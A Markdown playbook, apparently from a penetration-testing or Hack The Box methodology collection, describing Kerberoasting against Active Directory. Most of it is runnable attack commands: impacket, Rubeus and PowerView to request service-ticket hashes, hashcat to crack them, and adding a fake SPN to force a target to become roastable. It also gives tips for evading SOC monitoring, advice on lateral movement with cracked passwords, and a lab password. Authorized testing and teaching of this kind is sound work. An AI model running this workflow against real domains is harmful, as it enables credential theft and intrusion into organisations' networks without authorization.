# Kerberoasting

> Request TGS service tickets for accounts with SPNs, then crack the
> TGS hash offline.

## Objective
Obtain a crackable hash for any AD service account by exploiting the
Kerberos design where any authenticated user can request a service
ticket for any SPN.

## When To Use
- AD detected.
- You have *any* domain credential (Kerberoast requires authentication,
  unlike AS-REP).
- LDAP shows accounts with `servicePrincipalName=*`.

## Detection Indicators
- `(servicePrincipalName=*)` LDAP filter returns user accounts.
- `Get-DomainUser -SPN` (PowerView) returns hits.
- BloodHound's "Find Kerberoastable Users" query returns hits.

## Enumeration Strategy

### Find SPNs

```bash
# from Linux with a domain cred
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <ip>

# without -request, just lists; with -request, fetches the hashes
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <ip> -request \
  -outputfile kerberoast.hashes -format hashcat
```

```powershell
# from a Windows shell w/ user creds
. .\PowerView.ps1
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# or
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.hashes
```

## Exploitation Workflow

```bash
# 1. Get domain creds (any user works)
crackmapexec smb <ip> -u <u> -p '<p>'    # validate

# 2. Request the TGS hashes
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <ip> -request \
  -outputfile kerberoast.hashes -format hashcat

# 3. Crack
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -r best64.rule

# 4. Use the cracked password against the corresponding service account
```

## Commands

```bash
# Single SPN (named target)
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <ip> -request -spn 'MSSQLSvc/<host>:1433'

# Output is a $krb5tgs$23$* hash; mode 13100

# Targeted Kerberoasting — when you have GenericWrite on a user but the
# user has no SPN. Add an SPN, kerberoast, remove the SPN.
impacket-addspn -u <u> -p '<p>' -t <target> 'fake/spn' <dc-ip>
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <ip> -request -spn 'fake/spn'
impacket-addspn -u <u> -p '<p>' -t <target> 'fake/spn' <dc-ip> -r  # remove
```

## Tool Usage

- `impacket-GetUserSPNs` — Linux-side; canonical.
- `Rubeus.exe kerberoast` — Windows-side; works without dropping
  files if running from PowerShell.
- `kerberoast.py` (older) — superseded by impacket.
- `crackmapexec ldap --kerberoasting` — wrapper.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Wrong hashcat mode | Empty crack | `-m 13100` for TGS, **not** 18200 (AS-REP) |
| Forgetting `-request` | Only a list, no hashes | Always include `-request` |
| Wrong realm casing | "KDC_ERR_C_PRINCIPAL_UNKNOWN" | Use exact realm string |
| Clock skew | `KRB_AP_ERR_SKEW` | `sudo ntpdate <dc-ip>` |
| Targeting a krbtgt SPN | Empty/non-crackable | Filter on user accounts; krbtgt's TGS is encrypted with itself |

## Decision-Making Logic

```
have any domain cred?
  Yes → GetUserSPNs (-request) → hashes for every SPN-having user
        └─ for each hash:
             hashcat -m 13100 → cracked password
             use cred for the service account
  No  → can't kerberoast (need auth)
        └─ pivot to AS-REP, password spray, or anonymous enum
```

The most valuable hits are accounts in privileged groups (Domain Admins,
Account Operators, Server Operators). On real shops these are rare;
on HTB, the Administrator account *itself* sometimes has an SPN
(see Active).

## Pivot Opportunities
A cracked Kerberoast password gives you:
- Auth as that service account → its host machine privileges.
- Lateral movement to its associated services (MSSQL, IIS, Exchange).
- Often, the service account is local admin somewhere — sweep with
  `crackmapexec`.

## OPSEC Considerations
- Kerberoast requests log Event ID 4769 (Kerberos service ticket
  requested). Mature SOCs threshold-monitor this.
- Use Rubeus's `/usetgtdeleg` flag to avoid pre-creating SMB sessions.
- Cracking is silent.
- Avoid requesting *every* SPN at once on hardened environments;
  request targeted ones.

## Real HTB Examples

- **Active** — `Administrator` account has an SPN; the hash cracks to
  `Ticketmaster1968`.
- **Sauna, Forest** — Kerberoast not the primary path but available
  post-foothold.
- **Mantis, Sizzle, Cascade** — Kerberoast available as alternative.
- **Resolute** — Kerberoast feasible on `ryan` post-foothold.
- **Multimaster** — Kerberoast is part of the chain.
- **Outdated, Authority, Forge, Ophiuchi** — modern AD chains where
  Kerberoast is one of several primitives.

## Alternative Techniques

- **AS-REP Roasting** — different attack, same crack pipeline. Mode
  18200.
- **Password spraying** — when you know users but not creds.
- **PKINIT abuse / Pass-the-Cert** — modern variants in ADCS-equipped
  environments.
- **Silver / Golden tickets** — if you already have TGT.

## Automation Opportunities

```bash
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <ip> -request \
  -outputfile kerberoast.hashes -format hashcat
[ -s kerberoast.hashes ] && hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt --quiet
hashcat -m 13100 kerberoast.hashes --show
```

## Checklist

- [ ] Confirm domain creds work (`crackmapexec smb`)
- [ ] List SPNs without `-request` first to see what's there
- [ ] `-request -outputfile -format hashcat` to capture hashes
- [ ] Hashcat `-m 13100`
- [ ] Try cracked password against the service account on every host
- [ ] BloodHound: mark Kerberoasted user as owned

## Related Skills

- [`active-directory/as-rep-roasting.md`](as-rep-roasting.md)
- [`active-directory/bloodhound-usage.md`](bloodhound-usage.md)
- [`active-directory/dcsync.md`](dcsync.md)
- [`tool-usage/impacket.md`](../tool-usage/impacket.md)
- [`tool-usage/hashcat.md`](../tool-usage/hashcat.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
